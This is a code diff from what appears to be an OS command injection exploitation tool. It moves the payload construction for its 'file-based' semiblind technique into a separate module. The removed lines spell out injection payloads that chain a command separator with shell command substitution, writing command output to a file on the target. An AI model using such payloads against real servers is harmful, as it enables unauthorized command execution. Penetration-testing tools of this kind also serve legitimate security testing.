@@ -32,6 +32,7 @@ from src.core.requests import headers
 from src.core.requests import parameters
 
 from src.core.injections.semiblind_based.techniques import tempfile_based
+from src.core.injections.semiblind_based.techniques.payloads import file_based_payloads
 
 """
  The "File-based" technique on Semiblind-based OS Command Injection.
@@ -82,9 +83,9 @@ def exploitation(url,delay,filename,http_request_method):
 	
 	sys.stdout.write( "\n(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on "+settings.SRV_ROOT_DIR+"... ")
 	try:
-	  payload = (seperator + " " +
-		    "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + " >" + OUTPUT_TEXTFILE + ")"
-		      ) 
+	  
+	  # File-based decision payload (check if host is vulnerable).
+	  payload = file_based_payloads.decision(seperator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE)
 		  
 	  # Check if defined "--prefix" option.
 	  if menu.options.prefix:
@@ -190,7 +191,7 @@ def exploitation(url,delay,filename,http_request_method):
 	  except urllib2.HTTPError, e:
 	      if e.getcode() == 404:
 		
-		stop_injection = False
+		stop_injection = True
 		if menu.options.tmp_path:
 		  tmp_path = menu.options.tmp_path
 		else:
@@ -273,10 +274,10 @@ def exploitation(url,delay,filename,http_request_method):
 		  sys.exit(0)
 		  
 		else:
-		  payload = (seperator +
-			    "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
-			    )
 		  
+		  # Execute shell commands on vulnerable host.
+		  payload = file_based_payloads.cmd_execution(seperator,cmd,OUTPUT_TEXTFILE) 
+
 		  if seperator == " " :
 		    payload = re.sub(" ", "%20", payload)
 		  else:
